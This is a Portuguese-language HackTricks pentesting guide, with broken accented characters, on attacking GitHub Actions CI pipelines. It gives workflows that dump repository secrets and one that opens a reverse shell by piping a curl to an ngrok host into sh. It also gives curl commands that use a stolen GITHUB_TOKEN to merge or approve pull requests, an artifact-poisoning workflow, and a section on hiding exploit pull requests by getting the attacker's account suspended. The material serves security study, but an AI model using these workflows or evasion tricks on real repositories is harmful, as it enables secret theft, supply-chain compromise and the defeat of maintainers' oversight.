# Abusando das A√ß√µes do Github

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Informa√ß√µes B√°sicas

Nesta p√°gina, voc√™ encontrar√°:

* Um **resumo de todos os impactos** de um invasor que consegue acessar uma A√ß√£o do Github
* Diferentes maneiras de **acessar uma a√ß√£o**:
* Ter **permiss√µes** para criar a a√ß√£o
* Abusar dos gatilhos relacionados a **pull request**
* Abusar de **outras t√©cnicas de acesso externo**
* **Pivotar** de um reposit√≥rio j√° comprometido
* Por fim, uma se√ß√£o sobre **t√©cnicas de p√≥s-explora√ß√£o para abusar de uma a√ß√£o de dentro** (causando os impactos mencionados)

## Resumo dos Impactos

Para uma introdu√ß√£o sobre [**A√ß√µes do Github, verifique as informa√ß√µes b√°sicas**](../basic-github-information.md#github-actions).

Caso voc√™ possa **executar a√ß√µes do Github arbitrariamente/injetar c√≥digo** em um **reposit√≥rio**, voc√™ pode ser capaz de:

* **Roubar** os **segredos** desse reposit√≥rio/organiza√ß√£o.
* Se voc√™ s√≥ pode injetar, pode roubar o que j√° est√° presente no fluxo de trabalho.
* Abusar dos **privil√©gios do reposit√≥rio** para acessar outras plataformas como AWS e GCP.
* **Executar c√≥digo em workers personalizados** (se workers personalizados forem usados) e tentar pivotar a partir da√≠.
* **Sobrescrever** o **c√≥digo** do reposit√≥rio.
* Isso depende dos privil√©gios do `GITHUB_TOKEN` (se houver).
* **Comprometer** **implanta√ß√µes** e outros **artefatos**.
* Se o c√≥digo estiver implantando ou armazenando algo, voc√™ pode modific√°-lo e obter algum acesso adicional.

## GITHUB\_TOKEN

Esse "**segredo**" (vindo de `${{ secrets.GITHUB_TOKEN }}` e `${{ github.token }}`) √© fornecido quando o administrador habilita essa op√ß√£o:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Esse token √© o mesmo que um **Aplicativo do Github usar√°**, ent√£o ele pode acessar os mesmos endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
O Github deve lan√ßar um [**fluxo**](https://github.com/github/roadmap/issues/74) que **permite acesso entre reposit√≥rios** dentro do GitHub, para que um reposit√≥rio possa acessar outros reposit√≥rios internos usando o `GITHUB_TOKEN`.
{% endhint %}

Voc√™ pode ver as poss√≠veis **permiss√µes** deste token em: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Observe que o token **expira ap√≥s a conclus√£o do trabalho**.\
Esses tokens se parecem com isso: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algumas coisas interessantes que voc√™ pode fazer com este token:

{% tabs %}
{% tab title="Mesclar PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Aprovar PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Criar PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Observe que em v√°rias ocasi√µes voc√™ poder√° encontrar **tokens de usu√°rio do Github dentro das vari√°veis de ambiente do Github Actions ou nos segredos**. Esses tokens podem conceder a voc√™ mais privil√©gios sobre o reposit√≥rio e a organiza√ß√£o.
{% endhint %}

<details>

<summary>Listar segredos na sa√≠da do Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obter shell reversa com segredos</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

## Execu√ß√£o Permitida

{% hint style="info" %}
Esta seria a maneira mais f√°cil de comprometer as a√ß√µes do Github, pois este caso pressup√µe que voc√™ tenha acesso para **criar um novo reposit√≥rio na organiza√ß√£o**, ou tenha **privil√©gios de escrita sobre um reposit√≥rio**.

Se voc√™ estiver nesse cen√°rio, voc√™ pode simplesmente verificar as [T√©cnicas de P√≥s-Explora√ß√£o](./#t√©cnicas-de-p√≥s-explora√ß√£o-de-dentro-de-uma-a√ß√£o).
{% endhint %}

### Execu√ß√£o a partir da Cria√ß√£o do Reposit√≥rio

Caso os membros de uma organiza√ß√£o possam **criar novos reposit√≥rios** e voc√™ possa executar a√ß√µes do Github, voc√™ pode **criar um novo reposit√≥rio e roubar as chaves definidas no n√≠vel da organiza√ß√£o**.

### Execu√ß√£o a partir de um Novo Branch

Se voc√™ pode **criar um novo branch em um reposit√≥rio que j√° cont√©m uma A√ß√£o do Github** configurada, voc√™ pode **modific√°-la**, **fazer o upload** do conte√∫do e, em seguida, **executar essa a√ß√£o a partir do novo branch**. Dessa forma, voc√™ pode **extrair segredos do reposit√≥rio e da organiza√ß√£o** (mas voc√™ precisa saber como eles s√£o chamados).

Voc√™ pode tornar a a√ß√£o modificada execut√°vel **manualmente**, quando um **PR √© criado** ou quando **algum c√≥digo √© enviado** (dependendo de qu√£o barulhento voc√™ quer ser):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Execu√ß√£o Forked

{% hint style="info" %}
Existem diferentes gatilhos que podem permitir a um atacante **executar uma A√ß√£o do Github de outro reposit√≥rio**. Se essas a√ß√µes acion√°veis forem mal configuradas, um atacante poder√° compromet√™-las.
{% endhint %}

### `pull_request`

O gatilho de fluxo de trabalho **`pull_request`** executar√° o fluxo de trabalho sempre que uma solicita√ß√£o de pull for recebida com algumas exce√ß√µes: por padr√£o, se for a **primeira vez** que voc√™ est√° **colaborando**, algum **mantenedor** precisar√° **aprovar** a **execu√ß√£o** do fluxo de trabalho:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Como a limita√ß√£o **padr√£o** √© para **contribuidores de primeira vez**, voc√™ pode contribuir **corrigindo um bug/erro v√°lido** e depois enviar **outras PRs para abusar de seus novos privil√©gios de `pull_request`**.

**Testei isso e n√£o funciona**: ~~Outra op√ß√£o seria criar uma conta com o nome de algu√©m que contribuiu para o projeto e excluiu sua conta.~~
{% endhint %}

Al√©m disso, por padr√£o, **impede permiss√µes de grava√ß√£o** e **acesso a segredos** ao reposit√≥rio de destino, conforme mencionado na [**documenta√ß√£o**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Com exce√ß√£o de `GITHUB_TOKEN`, **os segredos n√£o s√£o passados para o executor** quando um fluxo de trabalho √© acionado a partir de um reposit√≥rio **forked**. O **`GITHUB_TOKEN` tem permiss√µes somente leitura** em solicita√ß√µes de pull **de reposit√≥rios forked**.

Um atacante pode modificar a defini√ß√£o da A√ß√£o do Github para executar coisas arbitr√°rias e anexar a√ß√µes arbitr√°rias. No entanto, ele n√£o poder√° roubar segredos ou sobrescrever o reposit√≥rio por causa das limita√ß√µes mencionadas.

{% hint style="danger" %}
**Sim, se o atacante alterar na PR a a√ß√£o do github que ser√° acionada, sua A√ß√£o do Github ser√° a usada e n√£o a do reposit√≥rio de origem!**
{% endhint %}

Como o atacante tamb√©m controla o c√≥digo que est√° sendo executado, mesmo que n√£o haja segredos ou permiss√µes de grava√ß√£o no `GITHUB_TOKEN`, um atacante poderia, por exemplo, **fazer upload de artefatos maliciosos**.

### **`pull_request_target`**

O gatilho de fluxo de trabalho **`pull_request_target`** tem **permiss√£o de grava√ß√£o** para o reposit√≥rio de destino e **acesso a segredos** (e n√£o solicita permiss√£o).

Observe que o gatilho de fluxo de trabalho **`pull_request_target`** **√© executado no contexto base** e n√£o no contexto fornecido pela PR (para **n√£o executar c√≥digo n√£o confi√°vel**). Para mais informa√ß√µes sobre `pull_request_target`, [**verifique a documenta√ß√£o**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Al√©m disso, para mais informa√ß√µes sobre esse uso espec√≠fico perigoso, verifique este [**post do blog do github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Pode parecer que, porque o **fluxo de trabalho executado** √© o definido na **base** e n√£o na PR, √© **seguro** usar **`pull_request_target`**, mas h√° **alguns casos em que n√£o √©**.

E este ter√° **acesso a segredos**.

### `workflow_run`

O gatilho [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permite executar um fluxo de trabalho a partir de um diferente quando ele estiver `conclu√≠do`, `solicitado` ou `em_progresso`.

Neste exemplo, um fluxo de trabalho √© configurado para ser executado ap√≥s o fluxo de trabalho separado "Executar Testes" ser conclu√≠do:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Al√©m disso, de acordo com a documenta√ß√£o: O fluxo de trabalho iniciado pelo evento `workflow_run` √© capaz de acessar segredos e gravar tokens, mesmo que o fluxo de trabalho anterior n√£o tenha feito isso.

Esse tipo de fluxo de trabalho pode ser atacado se depender de um fluxo de trabalho que pode ser acionado por um usu√°rio externo por meio de `pull_request` ou `pull_request_target`. Alguns exemplos vulner√°veis podem ser encontrados neste [blog](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability). O primeiro consiste no fluxo de trabalho acionado por `workflow_run` baixando o c√≥digo do atacante: `${{ github.event.pull_request.head.sha }}`. O segundo consiste em passar um artefato do c√≥digo n√£o confi√°vel para o fluxo de trabalho `workflow_run` e usar o conte√∫do desse artefato de uma maneira que o torne vulner√°vel a RCE.

## Abusando da Execu√ß√£o de Forks

Mencionamos todas as maneiras pelas quais um atacante externo pode fazer com que um fluxo de trabalho do GitHub seja executado, agora vamos dar uma olhada em como essas execu√ß√µes, se mal configuradas, podem ser abusadas:

### Execu√ß√£o de checkout n√£o confi√°vel

No caso de `pull_request`, o fluxo de trabalho ser√° executado no contexto do PR (portanto, executar√° o c√≥digo malicioso do PR), mas algu√©m precisa autoriz√°-lo primeiro e ele ser√° executado com algumas [limita√ß√µes](./#pull\_request).

No caso de um fluxo de trabalho usando `pull_request_target` ou `workflow_run` que depende de um fluxo de trabalho que pode ser acionado por `pull_request_target` ou `pull_request`, o c√≥digo do reposit√≥rio original ser√° executado, portanto, o atacante n√£o pode controlar o c√≥digo executado.

{% hint style="danger" %}
No entanto, se a a√ß√£o tiver um checkout expl√≠cito do PR que obter√° o c√≥digo do PR (e n√£o da base), ela usar√° o c√≥digo controlado pelo atacante. Por exemplo (verifique a linha 12 onde o c√≥digo do PR √© baixado):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSEGURO. Fornecido apenas como exemplo.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

O c√≥digo potencialmente n√£o confi√°vel √© executado durante `npm install` ou `npm build`, pois os scripts de compila√ß√£o e os pacotes referenciados s√£o controlados pelo autor do PR.

{% hint style="warning" %}
Uma dica de busca no GitHub para a√ß√µes vulner√°veis √©: `event.pull_request pull_request_target extension:yml`, no entanto, existem diferentes maneiras de configurar os trabalhos para serem executados com seguran√ßa, mesmo que a a√ß√£o esteja configurada de forma insegura (como usar condicionais sobre quem √© o ator que gera o PR).
{% endhint %}

### Inje√ß√µes de Script de Contexto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Observe que existem certos [contextos do GitHub](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cujos valores s√£o controlados pelo usu√°rio que cria o PR. Se a a√ß√£o do GitHub estiver usando esses dados para executar qualquer coisa, isso pode levar √† execu√ß√£o de c√≥digo arbitr√°rio:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### Inje√ß√£o de Script GITHUB_ENV <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

De acordo com a documenta√ß√£o: Voc√™ pode tornar uma vari√°vel de ambiente dispon√≠vel para etapas subsequentes em um trabalho de fluxo de trabalho definindo ou atualizando a vari√°vel de ambiente e gravando isso no arquivo de ambiente `GITHUB_ENV`.

Se um atacante puder injetar qualquer valor nessa vari√°vel de ambiente, ele poder√° injetar vari√°veis de ambiente que podem executar c√≥digo nas etapas seguintes, como `LD_PRELOAD` ou `NODE_OPTIONS`.

Por exemplo ([este](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) e [este](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine um fluxo de trabalho que confia em um artefato enviado para armazenar seu conte√∫do na vari√°vel de ambiente `GITHUB_ENV`. Um atacante poderia enviar algo assim para compromet√™-lo:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### A√ß√µes de Terceiros Vulner√°veis do Github

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Conforme mencionado neste [post do blog](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), essa A√ß√£o do GitHub permite acessar artefatos de diferentes fluxos de trabalho e at√© mesmo reposit√≥rios.

O problema √© que, se o par√¢metro `path` n√£o for definido, o artefato ser√° extra√≠do no diret√≥rio atual e poder√° substituir arquivos que podem ser usados posteriormente ou at√© mesmo executados no fluxo de trabalho. Portanto, se o Artefato for vulner√°vel, um atacante poder√° abusar disso para comprometer outros fluxos de trabalho que confiam no Artefato.

Exemplo de fluxo de trabalho vulner√°vel:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Isso pode ser atacado com o seguinte fluxo de trabalho:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Outro Acesso Externo

### Sequestro de Reposit√≥rio de Namespace Exclu√≠do

Este √© um bom post de blog para ler sobre vulnerabilidades corrigidas que permitiriam a um invasor roubar um namespace exclu√≠do para roubar um reposit√≥rio famoso (potencialmente devido a uma renomea√ß√£o do namespace): [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivoteamento de Reposit√≥rio

{% hint style="info" %}
Nesta se√ß√£o, falaremos sobre t√©cnicas que permitiriam fazer um **pivoteamento de um reposit√≥rio para outro**, supondo que tenhamos algum tipo de acesso no primeiro (verifique a se√ß√£o anterior).
{% endhint %}

### Envenenamento de Cache

Um cache √© mantido entre **execu√ß√µes de fluxo de trabalho na mesma branch**. Isso significa que se um invasor **comprometer** um **pacote** que √© ent√£o armazenado no cache e **baixado** e executado por um fluxo de trabalho **mais privilegiado**, ele ser√° capaz de **comprometer** tamb√©m esse fluxo de trabalho.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Envenenamento de Artefato

Os fluxos de trabalho podem usar **artefatos de outros fluxos de trabalho e at√© mesmo de reposit√≥rios**, se um invasor conseguir **comprometer** a A√ß√£o do Github que **faz o upload de um artefato** que √© posteriormente usado por outro fluxo de trabalho, ele poder√° **comprometer os outros fluxos de trabalho**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## P√≥s-Explora√ß√£o a partir de uma A√ß√£o

### Acessando AWS e GCP via OIDC

Verifique as seguintes p√°ginas:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Acessando segredos <a href="#accessing-secrets" id="accessing-secrets"></a>

Se voc√™ estiver injetando conte√∫do em um script, √© interessante saber como acessar segredos:

* Se o segredo ou token for definido como uma **vari√°vel de ambiente**, ele pode ser acessado diretamente por meio do ambiente usando **`printenv`**.
* Se o segredo for usado **diretamente em uma express√£o**, o script shell gerado √© armazenado **em disco** e √© acess√≠vel.
*   Para uma **a√ß√£o personalizada**, o risco pode variar dependendo de como um programa est√° usando o segredo obtido do **argumento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusando de runners auto-hospedados

A maneira de descobrir quais **A√ß√µes do Github est√£o sendo executadas em infraestrutura n√£o-Github** √© procurar por **`runs-on: self-hosted`** no arquivo de configura√ß√£o da A√ß√£o do Github.

Os runners **auto-hospedados** podem ter acesso a **informa√ß√µes extra sens√≠veis**, a outros **sistemas de rede** (pontos finais vulner√°veis na rede? servi√ßo de metadados?) ou, mesmo que esteja isolado e destru√≠do, **mais de uma a√ß√£o pode ser executada ao mesmo tempo** e a maliciosa pode **roubar os segredos** da outra.

### Registro de Imagens Docker do Github

√â poss√≠vel criar a√ß√µes do Github que ir√£o **construir e armazenar uma imagem Docker dentro do Github**.\
Um exemplo pode ser encontrado no seguinte trecho:

<details>

<summary>A√ß√£o do Github para Construir e Enviar Imagem Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como voc√™ pode ver no c√≥digo anterior, o registro do Github √© hospedado em **`ghcr.io`**.

Um usu√°rio com permiss√µes de leitura sobre o reposit√≥rio poder√° ent√£o baixar a imagem Docker usando um token de acesso pessoal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Em seguida, o usu√°rio pode procurar por **segredos vazados nas camadas da imagem Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informa√ß√µes sens√≠veis nos logs do Github Actions

Mesmo que o **Github** tente **detectar valores secretos** nos logs das a√ß√µes e **evite mostr√°-los**, **outros dados sens√≠veis** que possam ter sido gerados na execu√ß√£o da a√ß√£o n√£o ser√£o ocultados. Por exemplo, um JWT assinado com um valor secreto n√£o ser√° ocultado, a menos que seja [configurado especificamente](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Encobrindo seus Rastros

(T√©cnica da [**qui**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Primeiro de tudo, qualquer PR levantado √© claramente vis√≠vel para o p√∫blico no Github e para a conta GitHub de destino. No GitHub, por padr√£o, **n√£o podemos excluir um PR da internet**, mas h√° uma reviravolta. Para contas do Github que s√£o **suspensas** pelo Github, todos os seus **PRs s√£o automaticamente exclu√≠dos** e removidos da internet. Portanto, para ocultar sua atividade, voc√™ precisa ou ter sua **conta do GitHub suspensa ou ter sua conta sinalizada**. Isso **ocultaria todas as suas atividades** no GitHub da internet (basicamente removeria todos os seus PRs de explora√ß√£o)

Uma organiza√ß√£o no GitHub √© muito proativa em relatar contas ao GitHub. Tudo o que voc√™ precisa fazer √© compartilhar "algumas coisas" em um problema e eles garantir√£o que sua conta seja suspensa em 12 horas :p e l√° est√°, tornou sua explora√ß√£o invis√≠vel no github.

{% hint style="warning" %}
A √∫nica maneira para uma organiza√ß√£o descobrir que foi alvo √© verificar os logs do GitHub a partir do SIEM, pois na interface do GitHub o PR seria removido.
{% endhint %}

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
